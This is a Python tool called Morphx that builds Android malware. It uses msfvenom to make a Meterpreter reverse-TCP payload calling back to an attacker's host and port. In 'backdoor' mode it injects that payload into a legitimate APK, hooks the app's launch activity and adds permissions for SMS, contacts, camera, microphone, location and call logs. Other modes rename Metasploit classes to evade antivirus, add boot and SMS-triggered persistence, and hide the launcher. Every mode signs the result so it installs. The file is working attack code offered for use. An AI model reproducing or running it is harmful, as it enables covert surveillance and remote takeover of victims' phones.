#!/usr/bin/env python3
"""
Morphx – Android Payload Generator
"""

import os, sys, subprocess, shutil, random, string, re, argparse
from pathlib import Path
from typing import Optional, List

# ---------- ANSI colours ----------
R = "\033[0m"
BOLD = "\033[1m"
RED = "\033[31m"
GREEN = "\033[32m"
LGREEN = "\033[92m"
YELLOW = "\033[33m"
LYELLOW = "\033[93m"

def print_banner():
    ver = "v2.0"
    # Simple green block-style banner matching the original bash version
    print(f"{LGREEN}")
    print("              __  ___                  __             ")
    print("             /  |/  /___   ____ ___   / /  __ __       ")
    print("            / /|_/ // _ \\ / __// _ \\ / _ \\ \\ \\ /        ")
    print("           /_/  /_/ \\___//_/  / .__//_//_//_\\_\\         ")
    print("          /_/                /_/                 " + ver)
    print(f"\033[1;37m                    Coded by Tunisian HxRofo          \033[0m")
    print(f"{R}")

def print_ok(msg: str):    print(f"{GREEN}[✔] {msg}{R}")
def print_fail(msg: str):  print(f"{RED}[X] {msg}{R}")
def print_info(msg: str):  print(f"{YELLOW}[*] {msg}{R}")
def print_step(msg: str):  print(f"{LYELLOW}[*] {msg}{R}")

def rand_word(length=8) -> str:
    return ''.join(random.choices(string.ascii_lowercase, k=length))

# ---------- Paths ----------
SCRIPT_DIR = Path(__file__).parent.resolve()
INPUT_DIR = SCRIPT_DIR / "input"
OUTPUT_DIR = SCRIPT_DIR / "output"

# ---------- Tool discovery ----------
def find_tool(name: str) -> Optional[str]:
    local_input = INPUT_DIR / name
    if local_input.is_file():
        return str(local_input)
    local_script = SCRIPT_DIR / name
    if local_script.is_file():
        return str(local_script)
    return shutil.which(name)

def find_apktool() -> Optional[str]:
    jar = INPUT_DIR / "apktool.jar"
    if jar.exists():
        return f"java -jar {jar}"
    jar = SCRIPT_DIR / "apktool.jar"
    if jar.exists():
        return f"java -jar {jar}"
    script = INPUT_DIR / "apktool"
    if script.is_file():
        return str(script)
    script = SCRIPT_DIR / "apktool"
    if script.is_file():
        return str(script)
    system = shutil.which("apktool")
    return system

def check_all_tools():
    required = ["msfvenom", "java", "keytool", "zipalign"]
    for tool in required:
        if not find_tool(tool):
            print_fail(f"{tool} not found. Please install it or place the binary in input/.")
            sys.exit(1)
    apk = find_apktool()
    if not apk:
        print_fail("apktool not found. Place apktool.jar or apktool script in input/ folder.")
        sys.exit(1)
    return apk

class Apktool:
    def __init__(self, cmd: str): self.cmd = cmd
    def run(self, *args):
        full = self.cmd.split() + list(args)
        proc = subprocess.run(full, capture_output=True, text=True)
        if proc.returncode != 0:
            raise RuntimeError(f"apktool failed: {proc.stderr}")
    def decompile(self, apk: Path, out_dir: Path, force: bool = True):
        flags = ["d"] + (["-f"] if force else []) + ["-o", str(out_dir), str(apk)]
        self.run(*flags)
    def recompile(self, source_dir: Path, out_apk: Path, use_aapt2: bool = False):
        flags = ["b", "-o", str(out_apk), str(source_dir)]
        if use_aapt2:
            flags.insert(1, "--use-aapt2")
        self.run(*flags)
    def empty_framework(self):
        self.run("empty-framework-dir", "--force")

# ---------- Payload ----------
def gen_payload(lhost: str, lport: int, payload: str, output: Path):
    subprocess.run([
        "msfvenom", "-p", payload,
        f"LHOST={lhost}", f"LPORT={lport}",
        "-a", "dalvik", "--platform", "android", "-f", "raw",
        "-o", str(output)
    ], check=True, capture_output=True)

# ---------- Signing ----------
def sign_apk(unsigned_apk: Path, final_apk: Path):
    keystore = Path.home() / ".android" / "debug.keystore"
    keystore.parent.mkdir(parents=True, exist_ok=True)
    if not keystore.exists():
        print_step("Generating debug keystore...")
        subprocess.run([
            "keytool", "-genkey", "-v", "-keystore", str(keystore),
            "-storepass", "android", "-alias", "androiddebugkey",
            "-keypass", "android", "-keyalg", "RSA", "-keysize", "2048",
            "-validity", "10000", "-dname", "CN=Android Debug,O=Android,C=US"
        ], check=True, capture_output=True)
    aligned = unsigned_apk.with_suffix(".aligned.apk")
    print_step("Aligning APK...")
    subprocess.run(["zipalign", "-v", "4", str(unsigned_apk), str(aligned)], check=True, capture_output=True)
    apksigner = find_tool("apksigner")
    if apksigner:
        print_step("Signing with apksigner (v2/v3)...")
        subprocess.run([
            apksigner, "sign", "--ks", str(keystore),
            "--ks-pass", "pass:android", "--key-pass", "pass:android",
            "--out", str(final_apk), str(aligned)
        ], check=True, capture_output=True)
    else:
        print_step("apksigner not found. Falling back to jarsigner (v1).")
        subprocess.run([
            "jarsigner", "-verbose",
            "-keystore", str(keystore),
            "-storepass", "android", "-keypass", "android",
            "-digestalg", "SHA-256", "-sigalg", "SHA256withRSA",
            str(aligned), "androiddebugkey"
        ], check=True, capture_output=True)
        shutil.move(str(aligned), str(final_apk))
    aligned.unlink(missing_ok=True)
    print_ok("APK signed successfully.")

# ---------- Icon ----------
def inject_icon(apk_dir: Path, icon_path: Path):
    try:
        from PIL import Image
    except ImportError:
        print_fail("Pillow is required. Install: pip install Pillow")
        sys.exit(1)
    densities = {"ldpi": 36, "mdpi": 48, "hdpi": 72, "xhdpi": 96, "xxhdpi": 144}
    img = Image.open(icon_path)
    res_dir = apk_dir / "res"
    for qualifier, size in densities.items():
        d = res_dir / f"drawable-{qualifier}-v4"
        d.mkdir(parents=True, exist_ok=True)
        img.resize((size, size), Image.LANCZOS).save(d / "icon.png", "PNG")
    manifest = apk_dir / "AndroidManifest.xml"
    text = manifest.read_text()
    if 'android:icon=' not in text.split('<application')[1].split('>')[0]:
        text = text.replace('<application', '<application android:icon="@drawable/icon"', 1)
    manifest.write_text(text)

# ---------- App label ----------
def set_app_label(manifest_path: Path, label: str):
    text = manifest_path.read_text()
    text = re.sub(r'android:label="[^"]*"', '', text)
    text = re.sub(r'(<application)(\s[^>]*)(>)', rf'\1\2 android:label="{label}"\3', text, count=1)
    if f'android:label="{label}"' not in text:
        text = text.replace('android:label="MainActivity"', f'android:label="{label}"')
    manifest_path.write_text(text)

# ---------- Stealth activity smali ----------
def generate_stealth_smali(package: str, class_name: str, service_class: str) -> str:
    return f""".class public L{package}/{class_name};
.super Landroid/app/Activity;
.source "{class_name}.java"

.method public constructor <init>()V
    .locals 0
    invoke-direct {{p0}}, Landroid/app/Activity;-><init>()V
    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 1
    invoke-super {{p0, p1}}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
    invoke-static {{}}, L{package}/{service_class};->start()V
    invoke-virtual {{p0}}, L{package}/{class_name};->finish()V
    return-void
.end method
"""

# ---------- MainBroadcastReceiver (dual trigger) ----------
def patch_receiver_smali(stage_dir: Path, package_slash: str):
    receiver_file = stage_dir / "MainBroadcastReceiver.smali"
    if not receiver_file.exists():
        return
    new_smali = f""".class public L{package_slash}/MainBroadcastReceiver;
.super Landroid/content/BroadcastReceiver;
.source "MainBroadcastReceiver.java"

.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 2
    invoke-virtual {{p2}}, Landroid/content/Intent;->getAction()Ljava/lang/String;
    move-result-object v0
    const-string v1, "android.intent.action.BOOT_COMPLETED"
    invoke-virtual {{v1, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :start
    const-string v1, "android.provider.Telephony.SMS_RECEIVED"
    invoke-virtual {{v1, v0}}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-eqz v1, :start
    return-void
    :start
    invoke-static {{}}, L{package_slash}/MainService;->start()V
    return-void
.end method
"""
    receiver_file.write_text(new_smali)

# ---------- Manifest SMS trigger addition ----------
def add_sms_trigger(manifest_path: Path):
    text = manifest_path.read_text()
    new_action = '\n                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>'
    text = text.replace(
        '<action android:name="android.intent.action.BOOT_COMPLETED"/>',
        '<action android:name="android.intent.action.BOOT_COMPLETED"/>' + new_action,
        1
    )
    manifest_path.write_text(text)

# ---------- Standalone AV evasion + SMS trigger ----------
def smali_rename_standalone(payload_dir: Path, app_label: Optional[str] = None):
    smali_root = payload_dir / "smali"
    old_metasploit = smali_root / "com" / "metasploit"
    if not old_metasploit.exists():
        raise FileNotFoundError("Expected smali/com/metasploit not found")

    VAR1 = rand_word()
    VAR2 = rand_word()
    VAR3 = rand_word()
    VAR4 = rand_word()
    VAR5 = rand_word()
    VAR6 = rand_word()
    VAR7 = rand_word()
    VAR8 = rand_word()

    new_base = smali_root / "com" / VAR1
    shutil.move(str(old_metasploit), str(new_base))
    stage_old = new_base / "stage"
    stage_new = new_base / VAR2
    shutil.move(str(stage_old), str(stage_new))
    payload_smali = stage_new / "Payload.smali"
    if payload_smali.exists():
        payload_smali.rename(stage_new / f"{VAR3}.smali")

    new_package_slash = f"com/{VAR1}/{VAR2}"
    patch_receiver_smali(stage_new, new_package_slash)

    for smali_file in stage_new.glob("*.smali"):
        content = smali_file.read_text()
        content = content.replace("/metasploit/stage", f"/{VAR1}/{VAR2}")
        content = content.replace("Payload", VAR3)
        content = content.replace("com.metasploit.meterpreter.AndroidMeterpreter",
                                  f"com.{VAR4}.{VAR5}.{VAR6}")
        content = content.replace("payload", VAR7)
        smali_file.write_text(content)

    manifest = payload_dir / "AndroidManifest.xml"
    text = manifest.read_text()
    text = text.replace("com.metasploit.stage", f"com.{VAR1}.{VAR2}")
    text = text.replace("metasploit", VAR8)
    text = re.sub(r'(<activity)(\s[^>]*?)(>)', r'\1 android:exported="true"\2\3', text, count=1)
    text = text.replace(
        '<uses-sdk android:minSdkVersion="10" android:targetSdkVersion="17"/>',
        '<uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33"/>'
    )
    if 'android:targetSdkVersion="33"' not in text:
        text = re.sub(r'<uses-sdk[^>]*/>',
                      '<uses-sdk android:minSdkVersion="21" android:targetSdkVersion="33"/>',
                      text, count=1)
    manifest.write_text(text)

    if app_label:
        set_app_label(manifest, app_label)
    add_sms_trigger(manifest)
    return VAR1, VAR2, VAR3

# ---------- Backdoor injection ----------
def backdoor_inject(payload_dir: Path, original_dir: Path):
    payload_smali = payload_dir / "smali"
    (payload_smali / "com" / "metasploit" / "stage" / "MainActivity.smali").unlink(missing_ok=True)
    smali_dirs = sorted(original_dir.glob("smali*"))

    orig_manifest = original_dir / "AndroidManifest.xml"
    text = orig_manifest.read_text()
    package_dot = re.search(r'package="([^"]+)"', text).group(1)
    package_slash = package_dot.replace(".", "/")

    app_name_dot = None
    app_match = re.search(r'<application[^>]+android:name="([^"]+)"', text)
    if app_match:
        app_name = app_match.group(1)
        if app_name.startswith("."):
            app_name_dot = package_dot + app_name
        else:
            app_name_dot = app_name

    VAR1 = rand_word()
    VAR2 = rand_word()
    VAR3 = rand_word()
    VAR4 = rand_word()

    target_smali = smali_dirs[0] if smali_dirs else original_dir / "smali"
    target_base = target_smali / package_slash
    if not target_base.exists() and app_name_dot:
        target_base = target_smali / app_name_dot.replace(".", "/")
    if not target_base.exists():
        raise FileNotFoundError("No smali directory found for the package")

    stage_source = payload_smali / "com" / "metasploit" / "stage"
    stage_dest = target_base / VAR1
    shutil.copytree(str(stage_source), str(stage_dest))

    for old, new in [
        ("MainBroadcastReceiver.smali", f"{VAR2}.smali"),
        ("MainService.smali", f"{VAR3}.smali"),
        ("Payload.smali", f"{VAR4}.smali"),
    ]:
        old_path = stage_dest / old
        if old_path.exists():
            old_path.rename(stage_dest / new)

    for smali_file in stage_dest.glob("*.smali"):
        content = smali_file.read_text()
        content = content.replace("com/metasploit/stage", f"{package_slash}/{VAR1}")
        content = content.replace("Payload", VAR4)
        content = content.replace("MainService", VAR3)
        content = content.replace("MainBroadcastReceiver", VAR2)
        smali_file.write_text(content)

    perm_block = '\n'.join([
        f'<uses-permission android:name="android.permission.{p}"/>'
        for p in [
            'INTERNET', 'ACCESS_NETWORK_STATE', 'ACCESS_WIFI_STATE',
            'ACCESS_COARSE_LOCATION', 'ACCESS_FINE_LOCATION', 'READ_PHONE_STATE',
            'SEND_SMS', 'RECEIVE_SMS', 'RECORD_AUDIO', 'CALL_PHONE',
            'READ_CONTACTS', 'WRITE_CONTACTS', 'WRITE_SETTINGS', 'CAMERA',
            'WRITE_EXTERNAL_STORAGE', 'RECEIVE_BOOT_COMPLETED', 'SET_WALLPAPER',
            'READ_CALL_LOG', 'WRITE_CALL_LOG', 'WAKE_LOCK', 'READ_SMS'
        ]
    ])
    text = text.replace('<application', perm_block + '\n<application', 1)

    receiver_name = f"{package_dot}.{VAR1}.{VAR2}" if not app_name_dot else f"{app_name_dot}.{VAR1}.{VAR2}"
    service_name = f"{package_dot}.{VAR1}.{VAR3}" if not app_name_dot else f"{app_name_dot}.{VAR1}.{VAR3}"

    receiver_block = f'''
        <receiver android:exported="true" android:label="{VAR2}" android:name="{receiver_name}">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
            </intent-filter>
        </receiver>
        <service android:exported="true" android:name="{service_name}"/>
'''
    text = text.replace('</application>', receiver_block + '</application>', 1)
    orig_manifest.write_text(text)

    main_activity_name = get_main_activity(original_dir)
    if main_activity_name:
        print_info(f"Main activity found: {main_activity_name}")
        hook_smali(smali_dirs, main_activity_name, package_dot, VAR1, VAR3, app_name_dot)
    else:
        print_fail("Could not determine main activity. Skipping smali hook.")

def get_main_activity(original_dir: Path) -> Optional[str]:
    manifest = original_dir / "AndroidManifest.xml"
    text = manifest.read_text()
    activity_blocks = re.findall(r'<activity[^>]*>(.*?)</activity>', text, re.DOTALL)
    for block in activity_blocks:
        if 'android.intent.action.MAIN' in block and 'android.intent.category.LAUNCHER' in block:
            start = text.find('<activity')
            end = text.find('>', start)
            header = text[start:end+1]
            name_match = re.search(r'android:name="([^"]+)"', header)
            if name_match:
                name = name_match.group(1)
                if name.startswith('.'):
                    package = re.search(r'package="([^"]+)"', text).group(1)
                    name = package + name
                return name.replace('.', '/')
    return None

def hook_smali(smali_dirs: List[Path], activity_slash: str, package_dot: str, stage_dir: str, service_class: str, app_dot=None):
    for smali_dir in smali_dirs:
        candidate = smali_dir / f"{activity_slash}.smali"
        if candidate.exists():
            smali_file = candidate
            break
    else:
        print_fail(f"Smali file not found for {activity_slash} in any smali* folder.")
        return

    lines = smali_file.read_text().splitlines()
    inject_line = None
    in_oncreate = False
    for i, line in enumerate(lines):
        if ".method public onCreate(Landroid/os/Bundle;)V" in line:
            in_oncreate = True
        if in_oncreate and "return-void" in line:
            inject_line = i
            break
        if in_oncreate and ".end method" in line:
            in_oncreate = False
    if inject_line is None:
        for i, line in enumerate(lines):
            if "return-void" in line:
                inject_line = i
                break
    if inject_line is None:
        print_fail("No injection point found.")
        return

    if app_dot:
        target = f"L{app_dot.replace('.', '/')}/{stage_dir}/{service_class};"
    else:
        target = f"L{package_dot.replace('.', '/')}/{stage_dir}/{service_class};"
    invoke = f"    invoke-static {{}}, {target}->start()V"
    lines.insert(inject_line, invoke)
    smali_file.write_text("\n".join(lines))
    print_ok(f"Injected start call into {activity_slash}.smali")

# ---------- CLI ----------
def parse_args():
    parser = argparse.ArgumentParser(description="Morphx - Android Payload Generator")
    sub = parser.add_subparsers(dest="mode", required=True)

    backdoor = sub.add_parser("backdoor", help="Backdoor an existing APK")
    backdoor.add_argument("--lhost", required=True)
    backdoor.add_argument("--lport", type=int, required=True)
    backdoor.add_argument("--payload", default="android/meterpreter/reverse_tcp")
    backdoor.add_argument("--original", required=True)
    backdoor.add_argument("--out", default="payload")
    backdoor.add_argument("--icon", default=None)
    backdoor.add_argument("--use-aapt2", action="store_true")

    bypass = sub.add_parser("bypass", help="Standalone payload with AV evasion + SMS trigger")
    bypass.add_argument("--lhost", required=True)
    bypass.add_argument("--lport", type=int, required=True)
    bypass.add_argument("--payload", default="android/meterpreter/reverse_tcp")
    bypass.add_argument("--name", required=True)
    bypass.add_argument("--icon", required=True)
    bypass.add_argument("--out", default="payload")

    stealth = sub.add_parser("stealth", help="Stealth persistence payload (boot + SMS trigger)")
    stealth.add_argument("--lhost", required=True)
    stealth.add_argument("--lport", type=int, required=True)
    stealth.add_argument("--payload", default="android/meterpreter/reverse_tcp")
    stealth.add_argument("--name", required=True)
    stealth.add_argument("--icon", required=True)
    stealth.add_argument("--out", default="payload")

    return parser.parse_args()

# ---------- Workflows ----------
def perform_backdoor(args):
    apktool_cmd = check_all_tools()
    apktool = Apktool(apktool_cmd)
    work_dir = SCRIPT_DIR / "morphx_work"
    work_dir.mkdir(exist_ok=True)
    raw = work_dir / "payload.apk"
    gen_payload(args.lhost, args.lport, args.payload, raw)

    print_step("Decompiling original APK...")
    orig_dec = work_dir / "original"
    apktool.decompile(Path(args.original), orig_dec)
    print_step("Decompiling payload APK...")
    pay_dec = work_dir / "payload_dec"
    apktool.decompile(raw, pay_dec)
    print_step("Injecting backdoor...")
    apktool.empty_framework()
    backdoor_inject(pay_dec, orig_dec)

    if args.icon:
        icon_path = Path(args.icon)
        if not icon_path.is_absolute():
            icon_path = INPUT_DIR / icon_path
        print_step("Applying custom icon...")
        inject_icon(orig_dec, icon_path)

    built = work_dir / "virus.apk"
    print_step("Rebuilding APK...")
    apktool.recompile(orig_dec, built, use_aapt2=args.use_aapt2)

    final = OUTPUT_DIR / f"{args.out}.apk"
    OUTPUT_DIR.mkdir(exist_ok=True)
    sign_apk(built, final)
    print_ok(f"Backdoored APK saved to {final}")
    shutil.rmtree(work_dir, ignore_errors=True)

def perform_bypass(args):
    apktool_cmd = check_all_tools()
    apktool = Apktool(apktool_cmd)
    work_dir = SCRIPT_DIR / "morphx_work"
    work_dir.mkdir(exist_ok=True)
    raw = work_dir / "payload.apk"
    gen_payload(args.lhost, args.lport, args.payload, raw)

    print_step("Decompiling payload...")
    pay_dec = work_dir / "payload_dec"
    apktool.decompile(raw, pay_dec)
    print_step("Applying AV evasion + SMS trigger...")
    smali_rename_standalone(pay_dec, app_label=args.name)

    icon_path = Path(args.icon)
    if not icon_path.is_absolute():
        icon_path = INPUT_DIR / icon_path
    print_step("Injecting icon...")
    inject_icon(pay_dec, icon_path)

    built = work_dir / "virus.apk"
    print_step("Rebuilding APK...")
    apktool.recompile(pay_dec, built)

    final = OUTPUT_DIR / f"{args.out}.apk"
    OUTPUT_DIR.mkdir(exist_ok=True)
    sign_apk(built, final)
    print_ok(f"APK saved to {final}")
    shutil.rmtree(work_dir, ignore_errors=True)

def perform_stealth(args):
    apktool_cmd = check_all_tools()
    apktool = Apktool(apktool_cmd)
    work_dir = SCRIPT_DIR / "morphx_work"
    work_dir.mkdir(exist_ok=True)
    raw = work_dir / "payload.apk"
    gen_payload(args.lhost, args.lport, args.payload, raw)

    print_step("Decompiling payload...")
    pay_dec = work_dir / "payload_dec"
    apktool.decompile(raw, pay_dec)

    VAR1, VAR2, VAR3 = smali_rename_standalone(pay_dec, app_label=args.name)
    stage_dir = pay_dec / "smali" / "com" / VAR1 / VAR2

    current_main = get_main_activity(pay_dec)
    if current_main:
        print_info(f"Current main activity: {current_main}")
        new_package = f"com/{VAR1}/{VAR2}"
        stealth_class_name = rand_word(10).capitalize()
        service_class = "MainService"

        stealth_path = stage_dir / f"{stealth_class_name}.smali"
        stealth_path.write_text(generate_stealth_smali(new_package, stealth_class_name, service_class))

        old_main = stage_dir / "MainActivity.smali"
        if old_main.exists():
            old_main.unlink()

        manifest = pay_dec / "AndroidManifest.xml"
        text = manifest.read_text()
        old_manifest_name = current_main.replace('/', '.')
        new_manifest_name = f"com.{VAR1}.{VAR2}.{stealth_class_name}"
        text = text.replace(f'android:name="{old_manifest_name}"', f'android:name="{new_manifest_name}"')
        text = text.replace('android:name=".MainActivity"', f'android:name=".{stealth_class_name}"')
        manifest.write_text(text)
    else:
        print_fail("Could not find launcher activity. Stealth activity NOT replaced.")

    icon_path = Path(args.icon)
    if not icon_path.is_absolute():
        icon_path = INPUT_DIR / icon_path
    print_step("Injecting icon...")
    inject_icon(pay_dec, icon_path)

    built = work_dir / "virus.apk"
    print_step("Rebuilding APK...")
    apktool.recompile(pay_dec, built)

    final = OUTPUT_DIR / f"{args.out}.apk"
    OUTPUT_DIR.mkdir(exist_ok=True)
    sign_apk(built, final)
    print_ok(f"Stealth APK saved to {final}")
    shutil.rmtree(work_dir, ignore_errors=True)

def main():
    print_banner()
    if os.geteuid() != 0:
        print_fail("Run as root (sudo).")
        sys.exit(1)

    args = parse_args()
    if args.mode == "backdoor":
        perform_backdoor(args)
    elif args.mode == "bypass":
        perform_bypass(args)
    elif args.mode == "stealth":
        perform_stealth(args)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{RED}[*] Interrupted. Exiting.{R}")
        shutil.rmtree(SCRIPT_DIR / "morphx_work", ignore_errors=True)
    except Exception as e:
        print_fail(f"Unexpected error: {e}")
        shutil.rmtree(SCRIPT_DIR / "morphx_work", ignore_errors=True)
        sys.exit(1)
